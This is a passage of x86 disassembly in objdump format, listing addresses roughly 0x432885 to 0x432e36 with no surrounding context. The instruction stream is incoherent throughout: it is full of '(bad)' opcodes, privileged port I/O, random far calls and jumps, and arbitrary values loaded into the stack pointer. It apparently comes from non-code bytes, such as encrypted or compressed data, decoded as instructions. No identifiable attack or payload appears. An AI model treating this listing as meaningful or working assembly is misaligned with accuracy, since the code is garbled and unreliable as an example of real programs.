  432885:	81 42 6f ec 7d b0 02 	addl   $0x2b07dec,0x6f(%edx)
  43288c:	eb bd                	jmp    0x43284b
  43288e:	3d ef 33 ee 6b       	cmp    $0x6bee33ef,%eax
  432893:	30 37                	xor    %dh,(%edi)
  432895:	09 53 05             	or     %edx,0x5(%ebx)
  432898:	56                   	push   %esi
  432899:	86 bc 0f d6 91 17 d8 	xchg   %bh,-0x27e86e2a(%edi,%ecx,1)
  4328a0:	24 d8                	and    $0xd8,%al
  4328a2:	4b                   	dec    %ebx
  4328a3:	67 40                	addr16 inc %eax
  4328a5:	8d 42 da             	lea    -0x26(%edx),%eax
  4328a8:	12 37                	adc    (%edi),%dh
  4328aa:	da 70 0d             	fidivl 0xd(%eax)
  4328ad:	d7                   	xlat   %ds:(%ebx)
  4328ae:	0c 9d                	or     $0x9d,%al
  4328b0:	e6 3b                	out    %al,$0x3b
  4328b2:	a0 0a 83 92 48       	mov    0x4892830a,%al
  4328b7:	78 96                	js     0x43284f
  4328b9:	b0 1d                	mov    $0x1d,%al
  4328bb:	99                   	cltd
  4328bc:	09 63 d6             	or     %esp,-0x2a(%ebx)
  4328bf:	f5                   	cmc
  4328c0:	3f                   	aas
  4328c1:	2b 3b                	sub    (%ebx),%edi
  4328c3:	be e4 3a 26 ab       	mov    $0xab263ae4,%esi
  4328c8:	aa                   	stos   %al,%es:(%edi)
  4328c9:	35 29 e1 b1 18       	xor    $0x18b1e129,%eax
  4328ce:	64 6d                	fs insl (%dx),%es:(%edi)
  4328d0:	2c 35                	sub    $0x35,%al
  4328d2:	e0 69                	loopne 0x43293d
  4328d4:	2a e2                	sub    %dl,%ah
  4328d6:	6d                   	insl   (%dx),%es:(%edi)
  4328d7:	f8                   	clc
  4328d8:	da a0 c7 6b 07 db    	fisubl -0x24f89439(%eax)
  4328de:	bc e4 b6 41 04       	mov    $0x441b6e4,%esp
  4328e3:	ef                   	out    %eax,(%dx)
  4328e4:	3b 61 7d             	cmp    0x7d(%ecx),%esp
  4328e7:	1b c0                	sbb    %eax,%eax
  4328e9:	f2 6a 0f             	repnz push $0xf
  4328ec:	bc e3 18 0e be       	mov    $0xbe0e18e3,%esp
  4328f1:	e7 fb                	out    %eax,$0xfb
  4328f3:	f9                   	stc
  4328f4:	35 9d e4 78 e1       	xor    $0xe178e49d,%eax
  4328f9:	73 2e                	jae    0x432929
  4328fb:	64 79 48             	fs jns 0x432946
  4328fe:	d9 c7                	fld    %st(7)
  432900:	bc f2 1f fb f9       	mov    $0xf9fb1ff2,%esp
  432905:	9a c2 a2 48 cc 7b e6 	lcall  $0xe67b,$0xcc48a2c2
  43290c:	ad                   	lods   %ds:(%esi),%eax
  43290d:	7e 8c                	jle    0x43289b
  43290f:	b6 b7                	mov    $0xb7,%dh
  432911:	26 50                	es push %eax
  432913:	66 35 b8 7e          	xor    $0x7eb8,%ax
  432917:	dc 5a b7             	fcompl -0x49(%edx)
  43291a:	5e                   	pop    %esi
  43291b:	80 30 7b             	xorb   $0x7b,(%eax)
  43291e:	13 fd                	adc    %ebp,%edi
  432920:	24 e5                	and    $0xe5,%al
  432922:	6a 79                	push   $0x79
  432924:	fa                   	cli
  432925:	fa                   	cli
  432926:	5e                   	pop    %esi
  432927:	36 e4 9f             	ss in  $0x9f,%al
  43292a:	6f                   	outsl  %ds:(%esi),(%dx)
  43292b:	17                   	pop    %ss
  43292c:	31 70 5b             	xor    %esi,0x5b(%eax)
  43292f:	2c 7b                	sub    $0x7b,%al
  432931:	ed                   	in     (%dx),%eax
  432932:	f3 21 43 50          	repz and %eax,0x50(%ebx)
  432936:	17                   	pop    %ss
  432937:	e1 f2                	loope  0x43292b
  432939:	d0 3c c0             	sarb   $1,(%eax,%eax,8)
  43293c:	e9 ce 99 8f c0       	jmp    0xc0d2c30f
  432941:	56                   	push   %esi
  432942:	b0 02                	mov    $0x2,%al
  432944:	75 15                	jne    0x43295b
  432946:	68 96 2b cc c2       	push   $0xc2cc2b96
  43294b:	92                   	xchg   %eax,%edx
  43294c:	34 b4                	xor    $0xb4,%al
  43294e:	b5 ca                	mov    $0xca,%ch
  432950:	0b 0f                	or     (%edi),%ecx
  432952:	33 df                	xor    %edi,%ebx
  432954:	25 5c 00 c2 91       	and    $0x91c2005c,%eax
  432959:	3a 7a 94             	cmp    -0x6c(%edx),%bh
  43295c:	9b                   	fwait
  43295d:	63 20                	arpl   %esp,(%eax)
  43295f:	7b 4f                	jnp    0x4329b0
  432961:	57                   	push   %edi
  432962:	54                   	push   %esp
  432963:	27                   	daa
  432964:	da 37                	fidivl (%edi)
  432966:	a1 25 86 3f 18       	mov    0x183f8625,%eax
  43296b:	85 f7                	test   %esi,%edi
  43296d:	f1                   	int1
  43296e:	15 1c 0a 32 fe       	adc    $0xfe320a1c,%eax
  432973:	e2 85                	loop   0x4328fa
  432975:	37                   	aaa
  432976:	03 ef                	add    %edi,%ebp
  432978:	c6                   	(bad)
  432979:	be 16 ba 36 d0       	mov    $0xd036ba16,%esi
  43297e:	ad                   	lods   %ds:(%esi),%eax
  43297f:	68 e4 04 0e ec       	push   $0xec0e04e4
  432984:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  432985:	84 d4                	test   %dl,%ah
  432987:	3d de a6 ca 0d       	cmp    $0xdcaa6de,%eax
  43298c:	63 26                	arpl   %esp,(%esi)
  43298e:	de 1a                	ficomps (%edx)
  432990:	da 5b cc             	ficompl -0x34(%ebx)
  432993:	b6 db                	mov    $0xdb,%dh
  432995:	c1 10 33             	rcll   $0x33,(%eax)
  432998:	cd ad                	int    $0xad
  43299a:	19 1e                	sbb    %ebx,(%esi)
  43299c:	53                   	push   %ebx
  43299d:	63 8f 09 bb 88 6a    	arpl   %ecx,0x6a88bb09(%edi)
  4329a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4329a4:	97                   	xchg   %eax,%edi
  4329a5:	ea a8 43 70 1f 45 68 	ljmp   $0x6845,$0x1f7043a8
  4329ac:	51                   	push   %ecx
  4329ad:	88 6a 6e             	mov    %ch,0x6e(%edx)
  4329b0:	13 9b b3 26 19 02    	adc    0x21926b3(%ebx),%ebx
  4329b6:	39 25 70 7b 09 d3    	cmp    %esp,0xd3097b70
  4329bc:	44                   	inc    %esp
  4329bd:	b7 88                	mov    $0x88,%bh
  4329bf:	07                   	pop    %es
  4329c0:	28 0b                	sub    %cl,(%ebx)
  4329c2:	16                   	push   %ss
  4329c3:	71 1b                	jno    0x4329e0
  4329c5:	83 13 1b             	adcl   $0x1b,(%ebx)
  4329c8:	d8 05 19 fe ac dd    	fadds  0xddacfe19
  4329ce:	72 7b                	jb     0x432a4b
  4329d0:	af                   	scas   %es:(%edi),%eax
  4329d1:	71 e0                	jno    0x4329b3
  4329d3:	20 09                	and    %cl,(%ecx)
  4329d5:	e9 e0 d2 fc a7       	jmp    0xa83ffcba
  4329da:	e4 1e                	in     $0x1e,%al
  4329dc:	38 84 f9 d0 cf 17 34 	cmp    %al,0x3417cfd0(%ecx,%edi,8)
  4329e3:	bc e1 85 2e 72       	mov    $0x722e85e1,%esp
  4329e8:	46                   	inc    %esi
  4329e9:	5b                   	pop    %ebx
  4329ea:	46                   	inc    %esi
  4329eb:	c7                   	(bad)
  4329ec:	3f                   	aas
  4329ed:	23 2d 5a 1d 31 c1    	and    0xc1311d5a,%ebp
  4329f3:	a1 c7 65 c2 6d       	mov    0x6dc265c7,%eax
  4329f8:	5d                   	pop    %ebp
  4329f9:	04 00                	add    $0x0,%al
  4329fb:	02 d3                	add    %bl,%dl
  4329fd:	8a 46 23             	mov    0x23(%esi),%al
  432a00:	47                   	inc    %edi
  432a01:	8d 62 aa             	lea    -0x56(%edx),%esp
  432a04:	3d 03 62 6a 39       	cmp    $0x396a6203,%eax
  432a09:	c4 9d 83 03 6d 40    	les    0x406d0383(%ebp),%ebx
  432a0f:	21 a8 e9 29 89 8c    	and    %ebp,-0x7376d617(%eax)
  432a15:	d8 74 5c 82          	fdivs  -0x7e(%esp,%ebx,2)
  432a19:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  432a1a:	ef                   	out    %eax,(%dx)
  432a1b:	91                   	xchg   %eax,%ecx
  432a1c:	17                   	pop    %ss
  432a1d:	bf 19 8e 23 7a       	mov    $0x7a238e19,%edi
  432a22:	49                   	dec    %ecx
  432a23:	e6 5a                	out    %al,$0x5a
  432a25:	fc                   	cld
  432a26:	0e                   	push   %cs
  432a27:	96                   	xchg   %eax,%esi
  432a28:	08 51 3e             	or     %dl,0x3e(%ecx)
  432a2b:	cb                   	lret
  432a2c:	e6 3c                	out    %al,$0x3c
  432a2e:	09 eb                	or     %ebp,%ebx
  432a30:	b6 1f                	mov    $0x1f,%dh
  432a32:	95                   	xchg   %eax,%ebp
  432a33:	b8 20 37 1d 29       	mov    $0x291d3720,%eax
  432a38:	7c 31                	jl     0x432a6b
  432a3a:	58                   	pop    %eax
  432a3b:	36 f8                	ss clc
  432a3d:	ce                   	into
  432a3e:	be fc 01 57 8c       	mov    $0x8c5701fc,%esi
  432a43:	53                   	push   %ebx
  432a44:	bc a1 39 1b eb       	mov    $0xeb1b39a1,%esp
  432a49:	b0 7b                	mov    $0x7b,%al
  432a4b:	f8                   	clc
  432a4c:	87 67 ae             	xchg   %esp,-0x52(%edi)
  432a4f:	be 46 c6 e2 46       	mov    $0x46e2c646,%esi
  432a54:	72 73                	jb     0x432ac9
  432a56:	c8 cd f5 16          	enter  $0xf5cd,$0x16
  432a5a:	eb a2                	jmp    0x4329fe
  432a5c:	2b 64 ab 13          	sub    0x13(%ebx,%ebp,4),%esp
  432a60:	c0 d0 47             	rcl    $0x47,%al
  432a63:	82 3d 31 a3 7d 0b 2f 	cmpb   $0x2f,0xb7da331
  432a6a:	1c 77                	sbb    $0x77,%al
  432a6c:	84 94 ef 82 69 d3 64 	test   %dl,0x64d36982(%edi,%ebp,8)
  432a73:	9a 5f 68 f9 c7 f6 a0 	lcall  $0xa0f6,$0xc7f9685f
  432a7a:	3a 78 df             	cmp    -0x21(%eax),%bh
  432a7d:	b7 2b                	mov    $0x2b,%bh
  432a7f:	e7 df                	out    %eax,$0xdf
  432a81:	08 f8                	or     %bh,%al
  432a83:	e4 6a                	in     $0x6a,%al
  432a85:	ef                   	out    %eax,(%dx)
  432a86:	ff 23                	jmp    *(%ebx)
  432a88:	c3                   	ret
  432a89:	04 3c                	add    $0x3c,%al
  432a8b:	83 6f eb 4e          	subl   $0x4e,-0x15(%edi)
  432a8f:	2b 5f d6             	sub    -0x2a(%edi),%ebx
  432a92:	f0 3e 19 dc          	lock ds sbb %ebx,%esp
  432a96:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432a97:	f6 97 df 01 e1 33    	notb   0x33e101df(%edi)
  432a9d:	da 51 fb             	ficoml -0x5(%ecx)
  432aa0:	0b 5a 2d             	or     0x2d(%edx),%ebx
  432aa3:	8e f1                	mov    %ecx,%?
  432aa5:	ba ed 2a c6 e0       	mov    $0xe0c62aed,%edx
  432aaa:	b4 08                	mov    $0x8,%ah
  432aac:	56                   	push   %esi
  432aad:	35 a1 6c 7b b3       	xor    $0xb37b6ca1,%eax
  432ab2:	7a 92                	jp     0x432a46
  432ab4:	4d                   	dec    %ebp
  432ab5:	9c                   	pushf
  432ab6:	43                   	inc    %ebx
  432ab7:	b0 a2                	mov    $0xa2,%al
  432ab9:	45                   	inc    %ebp
  432aba:	22 f6                	and    %dh,%dh
  432abc:	97                   	xchg   %eax,%edi
  432abd:	44                   	inc    %esp
  432abe:	ad                   	lods   %ds:(%esi),%eax
  432abf:	ca 99 88             	lret   $0x8899
  432ac2:	5a                   	pop    %edx
  432ac3:	1e                   	push   %ds
  432ac4:	72 ce                	jb     0x432a94
  432ac6:	1c 51                	sbb    $0x51,%al
  432ac8:	f9                   	stc
  432ac9:	f3 1c e3             	repz sbb $0xe3,%al
  432acc:	f0 53                	lock push %ebx
  432ace:	7e 1f                	jle    0x432aef
  432ad0:	94                   	xchg   %eax,%esp
  432ad1:	99                   	cltd
  432ad2:	3c 0f                	cmp    $0xf,%al
  432ad4:	47                   	inc    %edi
  432ad5:	e0 de                	loopne 0x432ab5
  432ad7:	c6                   	(bad)
  432ad8:	3c 41                	cmp    $0x41,%al
  432ada:	8e ca                	mov    %edx,%cs
  432adc:	1b 91 91 a1 65 59    	sbb    0x5965a191(%ecx),%edx
  432ae2:	a1 9c aa 06 ac       	mov    0xac06aa9c,%eax
  432ae7:	7a af                	jp     0x432a98
  432ae9:	21 0d 82 b0 4d ad    	and    %ecx,0xad4db082
  432aef:	1f                   	pop    %ds
  432af0:	c7 85 37 b4 24 09 cd 	movl   $0x30fce2cd,0x924b437(%ebp)
  432af7:	e2 fc 30 
  432afa:	b0 99                	mov    $0x99,%al
  432afc:	45                   	inc    %ebp
  432afd:	92                   	xchg   %eax,%edx
  432afe:	3b 37                	cmp    (%edi),%esi
  432b00:	d5 b3                	aad    $0xb3
  432b02:	52                   	push   %edx
  432b03:	da 7b 9b             	fidivrl -0x65(%ebx)
  432b06:	30 44 ea bd          	xor    %al,-0x43(%edx,%ebp,8)
  432b0a:	40                   	inc    %eax
  432b0b:	0d bb 94 f9 fc       	or     $0xfcf994bb,%eax
  432b10:	27                   	daa
  432b11:	4e                   	dec    %esi
  432b12:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432b13:	3c 2a                	cmp    $0x2a,%al
  432b15:	86 b0 88 db 1a ae    	xchg   %dh,-0x51e52478(%eax)
  432b1b:	78 93                	js     0x432ab0
  432b1d:	f4                   	hlt
  432b1e:	b7 8f                	mov    $0x8f,%bh
  432b20:	41                   	inc    %ecx
  432b21:	7c c1                	jl     0x432ae4
  432b23:	58                   	pop    %eax
  432b24:	d2 6a b0             	shrb   %cl,-0x50(%edx)
  432b27:	2d c2 57 39 40       	sub    $0x403957c2,%eax
  432b2c:	2d a2 31 6c c8       	sub    $0xc86c31a2,%eax
  432b31:	25 77 d1 d7 d9       	and    $0xd9d7d177,%eax
  432b36:	38 b3 bd 61 2d 64    	cmp    %dh,0x642d61bd(%ebx)
  432b3c:	60                   	pusha
  432b3d:	11 01                	adc    %eax,(%ecx)
  432b3f:	8f                   	(bad)
  432b40:	22 75 3c             	and    0x3c(%ebp),%dh
  432b43:	ca ea aa             	lret   $0xaaea
  432b46:	ea 29 de 1b 6e 29 8b 	ljmp   $0x8b29,$0x6e1bde29
  432b4d:	81 e6 fd 5b 2f 0c    	and    $0xc2f5bfd,%esi
  432b53:	b0 4e                	mov    $0x4e,%al
  432b55:	79 fc                	jns    0x432b53
  432b57:	95                   	xchg   %eax,%ebp
  432b58:	68 77 64 4a 5b       	push   $0x5b4a6477
  432b5d:	d6                   	salc
  432b5e:	0c ae                	or     $0xae,%al
  432b60:	8f                   	(bad)
  432b61:	3f                   	aas
  432b62:	42                   	inc    %edx
  432b63:	5d                   	pop    %ebp
  432b64:	ee                   	out    %al,(%dx)
  432b65:	99                   	cltd
  432b66:	db b5 b6 91 8e 4d    	(bad) 0x4d8e91b6(%ebp)
  432b6c:	fc                   	cld
  432b6d:	60                   	pusha
  432b6e:	16                   	push   %ss
  432b6f:	d8 39                	fdivrs (%ecx)
  432b71:	09 86 f3 56 46 0c    	or     %eax,0xc4656f3(%esi)
  432b77:	8b 99 1c 67 9a 4a    	mov    0x4a9a671c(%ecx),%ebx
  432b7d:	ee                   	out    %al,(%dx)
  432b7e:	39 5b 40             	cmp    %ebx,0x40(%ebx)
  432b81:	da cd                	fcmove %st(5),%st
  432b83:	27                   	daa
  432b84:	df 24 37             	fbld   (%edi,%esi,1)
  432b87:	6d                   	insl   (%dx),%es:(%edi)
  432b88:	2c 6f                	sub    $0x6f,%al
  432b8a:	0f a1                	pop    %fs
  432b8c:	c8 6f 20 32          	enter  $0x206f,$0x32
  432b90:	d8 e6                	fsub   %st(6),%st
  432b92:	fb                   	sti
  432b93:	cc                   	int3
  432b94:	d1 0a                	rorl   $1,(%edx)
  432b96:	bc d0 29 78 1f       	mov    $0x1f7829d0,%esp
  432b9b:	dd fe                	(bad)
  432b9d:	f0 0d 35 7b 9b 59    	lock or $0x599b7b35,%eax
  432ba3:	80 a2 bf 8a 33 38 77 	andb   $0x77,0x38338abf(%edx)
  432baa:	a8 c1                	test   $0xc1,%al
  432bac:	a8 79                	test   $0x79,%al
  432bae:	3f                   	aas
  432baf:	47                   	inc    %edi
  432bb0:	50                   	push   %eax
  432bb1:	c4 a8 26 92 5d 2c    	les    0x2c5d9226(%eax),%ebp
  432bb7:	79 b6                	jns    0x432b6f
  432bb9:	74 29                	je     0x432be4
  432bbb:	65 8f                	gs (bad)
  432bbd:	8f 47 b2             	pop    -0x4e(%edi)
  432bc0:	b9 56 f7 61 7b       	mov    $0x7b61f756,%ecx
  432bc5:	00 de                	add    %bl,%dh
  432bc7:	d7                   	xlat   %ds:(%ebx)
  432bc8:	93                   	xchg   %eax,%ebx
  432bc9:	8a 1a                	mov    (%edx),%bl
  432bcb:	14 9a                	adc    $0x9a,%al
  432bcd:	d4 9c                	aam    $0x9c
  432bcf:	6c                   	insb   (%dx),%es:(%edi)
  432bd0:	ac                   	lods   %ds:(%esi),%al
  432bd1:	52                   	push   %edx
  432bd2:	a9 7f 6f 4a 03       	test   $0x34a6f7f,%eax
  432bd7:	55                   	push   %ebp
  432bd8:	1c 50                	sbb    $0x50,%al
  432bda:	4c                   	dec    %esp
  432bdb:	b0 d0                	mov    $0xd0,%al
  432bdd:	d9 21                	fldenv (%ecx)
  432bdf:	67 f1                	addr16 int1
  432be1:	f2 30 9e f8 12 f4 6a 	repnz xor %bl,0x6af412f8(%esi)
  432be8:	67 18 85 89 db       	sbb    %al,-0x2477(%di)
  432bed:	f2 25 68 5e d2 61    	repnz and $0x61d25e68,%eax
  432bf3:	92                   	xchg   %eax,%edx
  432bf4:	c4 e5 89 ec          	(bad)
  432bf8:	37                   	aaa
  432bf9:	64 df cd             	fs (bad)
  432bfc:	da e8                	(bad)
  432bfe:	1e                   	push   %ds
  432bff:	3b ff                	cmp    %edi,%edi
  432c01:	bf ee 04 b9 dd       	mov    $0xddb904ee,%edi
  432c06:	d1 5a 87             	rcrl   $1,-0x79(%edx)
  432c09:	4c                   	dec    %esp
  432c0a:	e6 64                	out    %al,$0x64
  432c0c:	91                   	xchg   %eax,%ecx
  432c0d:	52                   	push   %edx
  432c0e:	ab                   	stos   %eax,%es:(%edi)
  432c0f:	f9                   	stc
  432c10:	3e f8                	ds clc
  432c12:	72 a9                	jb     0x432bbd
  432c14:	9e                   	sahf
  432c15:	9a f5 d8 8f e1 65 f0 	lcall  $0xf065,$0xe18fd8f5
  432c1c:	6a 99                	push   $0xffffff99
  432c1e:	1a 0e                	sbb    (%esi),%cl
  432c20:	d4 46                	aam    $0x46
  432c22:	f3 be 88 fc 9a 84    	repz mov $0x849afc88,%esi
  432c28:	2f                   	das
  432c29:	d3 9e d3 cf 98 5c    	rcrl   %cl,0x5c98cfd3(%esi)
  432c2f:	c0 b1 5b e1 31 84 b5 	shlb   $0xb5,-0x7bce1ea5(%ecx)
  432c36:	85 45 df             	test   %eax,-0x21(%ebp)
  432c39:	cd f6                	int    $0xf6
  432c3b:	54                   	push   %esp
  432c3c:	c2 5b e8             	ret    $0xe85b
  432c3f:	f9                   	stc
  432c40:	cd c4                	int    $0xc4
  432c42:	e5 1f                	in     $0x1f,%eax
  432c44:	2b e3                	sub    %ebx,%esp
  432c46:	8e 2b                	mov    (%ebx),%gs
  432c48:	15 e7 ae 72 70       	adc    $0x7072aee7,%eax
  432c4d:	36 c6                	ss (bad)
  432c4f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432c50:	a8 f6                	test   $0xf6,%al
  432c52:	16                   	push   %ss
  432c53:	21 59 75             	and    %ebx,0x75(%ecx)
  432c56:	cf                   	iret
  432c57:	1f                   	pop    %ds
  432c58:	02 61 6c             	add    0x6c(%ecx),%ah
  432c5b:	5b                   	pop    %ebx
  432c5c:	f6 95 ba 37 25 d2    	notb   -0x2ddac846(%ebp)
  432c62:	49                   	dec    %ecx
  432c63:	43                   	inc    %ebx
  432c64:	95                   	xchg   %eax,%ebp
  432c65:	16                   	push   %ss
  432c66:	2e ef                	cs out %eax,(%dx)
  432c68:	95                   	xchg   %eax,%ebp
  432c69:	e0 cf                	loopne 0x432c3a
  432c6b:	80 62 79 c9          	andb   $0xc9,0x79(%edx)
  432c6f:	cc                   	int3
  432c70:	b1 60                	mov    $0x60,%cl
  432c72:	6d                   	insl   (%dx),%es:(%edi)
  432c73:	9d                   	popf
  432c74:	ba 9b 82 30 16       	mov    $0x1630829b,%edx
  432c79:	d1 28                	shrl   $1,(%eax)
  432c7b:	3d b3 93 b3 15       	cmp    $0x15b393b3,%eax
  432c80:	80 7f 02 a2          	cmpb   $0xa2,0x2(%edi)
  432c84:	06                   	push   %es
  432c85:	d2 b9 98 9e 14 c1    	sarb   %cl,-0x3eeb6168(%ecx)
  432c8b:	38 40 1d             	cmp    %al,0x1d(%eax)
  432c8e:	99                   	cltd
  432c8f:	8f c6                	pop    %esi
  432c91:	c2 f0 e8             	ret    $0xe8f0
  432c94:	f7 68 91             	imull  -0x6f(%eax)
  432c97:	df ae e1 d8 09 4e    	fildll 0x4e09d8e1(%esi)
  432c9d:	46                   	inc    %esi
  432c9e:	b4 99                	mov    $0x99,%ah
  432ca0:	44                   	inc    %esp
  432ca1:	bd e5 43 ce 86       	mov    $0x86ce43e5,%ebp
  432ca6:	88 d8                	mov    %bl,%al
  432ca8:	41                   	inc    %ecx
  432ca9:	77 fe                	ja     0x432ca9
  432cab:	64 54                	fs push %esp
  432cad:	1c 0d                	sbb    $0xd,%al
  432caf:	92                   	xchg   %eax,%edx
  432cb0:	65 07                	gs pop %es
  432cb2:	61                   	popa
  432cb3:	8f c1                	pop    %ecx
  432cb5:	24 0f                	and    $0xf,%al
  432cb7:	ba 81 e3 16 39       	mov    $0x3916e381,%edx
  432cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  432cbd:	d6                   	salc
  432cbe:	5a                   	pop    %edx
  432cbf:	9e                   	sahf
  432cc0:	14 b9                	adc    $0xb9,%al
  432cc2:	f9                   	stc
  432cc3:	8d 5f 16             	lea    0x16(%edi),%ebx
  432cc6:	bc 99 70 3b a4       	mov    $0xa43b7099,%esp
  432ccb:	61                   	popa
  432ccc:	a9 23 af d4 d9       	test   $0xd9d4af23,%eax
  432cd1:	32 58 0b             	xor    0xb(%eax),%bl
  432cd4:	96                   	xchg   %eax,%esi
  432cd5:	ac                   	lods   %ds:(%esi),%al
  432cd6:	b3 e8                	mov    $0xe8,%bl
  432cd8:	13 81 ed 94 6b 24    	adc    0x246b94ed(%ecx),%eax
  432cde:	bc 37 68 63 a0       	mov    $0xa0636837,%esp
  432ce3:	a9 fd f2 b5 5d       	test   $0x5db5f2fd,%eax
  432ce8:	1c 51                	sbb    $0x51,%al
  432cea:	1b d4                	sbb    %esp,%edx
  432cec:	1d ed 0f 10 89       	sbb    $0x89100fed,%eax
  432cf1:	97                   	xchg   %eax,%edi
  432cf2:	38 7e f8             	cmp    %bh,-0x8(%esi)
  432cf5:	07                   	pop    %es
  432cf6:	8e ed                	mov    %ebp,%gs
  432cf8:	37                   	aaa
  432cf9:	c3                   	ret
  432cfa:	1d de f3 bc 97       	sbb    $0x97bcf3de,%eax
  432cff:	f8                   	clc
  432d00:	75 c3                	jne    0x432cc5
  432d02:	bf 84 39 c6 d7       	mov    $0xd7c63984,%edi
  432d07:	1f                   	pop    %ds
  432d08:	c3                   	ret
  432d09:	f0 2c d8             	lock sub $0xd8,%al
  432d0c:	0f 0e                	femms
  432d0e:	eb 7c                	jmp    0x432d8c
  432d10:	25 3e cd 81 a3       	and    $0xa381cd3e,%eax
  432d15:	69 df c7 b2 45 97    	imul   $0x9745b2c7,%edi,%ebx
  432d1b:	9b                   	fwait
  432d1c:	c9                   	leave
  432d1d:	95                   	xchg   %eax,%ebp
  432d1e:	0b 5d e0             	or     -0x20(%ebp),%ebx
  432d21:	31 0a                	xor    %ecx,(%edx)
  432d23:	69 94 11 2d 72 83 a0 	imul   $0xffe0ac9c,-0x5f7c8dd3(%ecx,%edx,1),%edx
  432d2a:	9c ac e0 ff 
  432d2e:	89 4c a9 b5          	mov    %ecx,-0x4b(%ecx,%ebp,4)
  432d32:	ad                   	lods   %ds:(%esi),%eax
  432d33:	b9 01 26 71 bc       	mov    $0xbc712601,%ecx
  432d38:	7c f4                	jl     0x432d2e
  432d3a:	f7 c2 3f 66 20 b6    	test   $0xb620663f,%edx
  432d40:	a2 18 19 ea 97       	mov    %al,0x97ea1918
  432d45:	d5 2b                	aad    $0x2b
  432d47:	55                   	push   %ebp
  432d48:	e7 8a                	out    %eax,$0x8a
  432d4a:	c5 e8 35             	(bad)
  432d4d:	63 54 a4 38          	arpl   %edx,0x38(%esp,%eiz,4)
  432d51:	d3 04 4c             	roll   %cl,(%esp,%ecx,2)
  432d54:	1c ad                	sbb    $0xad,%al
  432d56:	d6                   	salc
  432d57:	41                   	inc    %ecx
  432d58:	73 ca                	jae    0x432d24
  432d5a:	07                   	pop    %es
  432d5b:	e9 81 49 c0 87       	jmp    0x880376e1
  432d60:	08 3a                	or     %bh,(%edx)
  432d62:	5a                   	pop    %edx
  432d63:	bd 36 be 76 4e       	mov    $0x4e76be36,%ebp
  432d68:	81 e7 57 51 b2 8e    	and    $0x8eb25157,%edi
  432d6e:	75 14                	jne    0x432d84
  432d70:	b2 50                	mov    $0x50,%dl
  432d72:	4c                   	dec    %esp
  432d73:	7e e9                	jle    0x432d5e
  432d75:	06                   	push   %es
  432d76:	ab                   	stos   %eax,%es:(%edi)
  432d77:	d1 80 26 84 0c 4f    	roll   $1,0x4f0c8426(%eax)
  432d7d:	bd 8b d3 3f c3       	mov    $0xc33fd38b,%ebp
  432d82:	84 fa                	test   %bh,%dl
  432d84:	45                   	inc    %ebp
  432d85:	aa                   	stos   %al,%es:(%edi)
  432d86:	02 47 7f             	add    0x7f(%edi),%al
  432d89:	6a d3                	push   $0xffffffd3
  432d8b:	13 2c d0             	adc    (%eax,%edx,8),%ebp
  432d8e:	cf                   	iret
  432d8f:	68 ee 8a 98 34       	push   $0x34988aee
  432d94:	30 7f d0             	xor    %bh,-0x30(%edi)
  432d97:	5b                   	pop    %ebx
  432d98:	f0 a7                	lock cmpsl %es:(%edi),%ds:(%esi)
  432d9a:	bd 78 ba 63 82       	mov    $0x8263ba78,%ebp
  432d9f:	34 c2                	xor    $0xc2,%al
  432da1:	da b3 38 5f 0d 8e    	fidivl -0x71f2a0c8(%ebx)
  432da7:	1d 4b 71 ca cc       	sbb    $0xccca714b,%eax
  432dac:	c0 83 0d cd d5 1f 09 	rolb   $0x9,0x1fd5cd0d(%ebx)
  432db3:	48                   	dec    %eax
  432db4:	b2 55                	mov    $0x55,%dl
  432db6:	52                   	push   %edx
  432db7:	f3 7a 70             	repz jp 0x432e2a
  432dba:	37                   	aaa
  432dbb:	94                   	xchg   %eax,%esp
  432dbc:	92                   	xchg   %eax,%edx
  432dbd:	00 68 ac             	add    %ch,-0x54(%eax)
  432dc0:	23 8a e1 48 b8 c0    	and    -0x3f47b71f(%edx),%ecx
  432dc6:	5b                   	pop    %ebx
  432dc7:	2f                   	das
  432dc8:	2a 0f                	sub    (%edi),%cl
  432dca:	d3 b6 a7 60 4d 0b    	shll   %cl,0xb4d60a7(%esi)
  432dd0:	b1 cc                	mov    $0xcc,%cl
  432dd2:	f8                   	clc
  432dd3:	5e                   	pop    %esi
  432dd4:	22 13                	and    (%ebx),%dl
  432dd6:	5a                   	pop    %edx
  432dd7:	33 32                	xor    (%edx),%esi
  432dd9:	56                   	push   %esi
  432dda:	b8 0c da e5 ad       	mov    $0xade5da0c,%eax
  432ddf:	ad                   	lods   %ds:(%esi),%eax
  432de0:	f0 83 dd ed          	lock sbb $0xffffffed,%ebp
  432de4:	e7 91                	out    %eax,$0x91
  432de6:	65 c3                	gs ret
  432de8:	b5 84                	mov    $0x84,%ch
  432dea:	01 3c 84             	add    %edi,(%esp,%eax,4)
  432ded:	32 30                	xor    (%eax),%dh
  432def:	c3                   	ret
  432df0:	d8 99 79 00 f2 86    	fcomps -0x790dff87(%ecx)
  432df6:	c3                   	ret
  432df7:	84 21                	test   %ah,(%ecx)
  432df9:	b5 f8                	mov    $0xf8,%ch
  432dfb:	7f ba                	jg     0x432db7
  432dfd:	f0 9a 8e b1 10 eb 90 	lock lcall $0xd990,$0xeb10b18e
  432e04:	d9 
  432e05:	f3 9e                	repz sahf
  432e07:	51                   	push   %ecx
  432e08:	b5 be                	mov    $0xbe,%ch
  432e0a:	11 01                	adc    %eax,(%ecx)
  432e0c:	18 c2                	sbb    %al,%dl
  432e0e:	4b                   	dec    %ebx
  432e0f:	4d                   	dec    %ebp
  432e10:	eb 50                	jmp    0x432e62
  432e12:	d9 00                	flds   (%eax)
  432e14:	47                   	inc    %edi
  432e15:	bb 67 49 49 c5       	mov    $0xc5494967,%ebx
  432e1a:	b2 d5                	mov    $0xd5,%dl
  432e1c:	b7 77                	mov    $0x77,%bh
  432e1e:	58                   	pop    %eax
  432e1f:	72 75                	jb     0x432e96
  432e21:	62 ad c7 51 b9 54    	bound  %ebp,0x54b951c7(%ebp)
  432e27:	94                   	xchg   %eax,%esp
  432e28:	d0 0a                	rorb   $1,(%edx)
  432e2a:	72 ff                	jb     0x432e2b
  432e2c:	4e                   	dec    %esi
  432e2d:	87 05 45 cf 9e 2f    	xchg   %eax,0x2f9ecf45
  432e33:	51                   	push   %ecx
  432e34:	eb 72                	jmp    0x432ea8
  432e36:	e6 47                	out    %al,$0x47
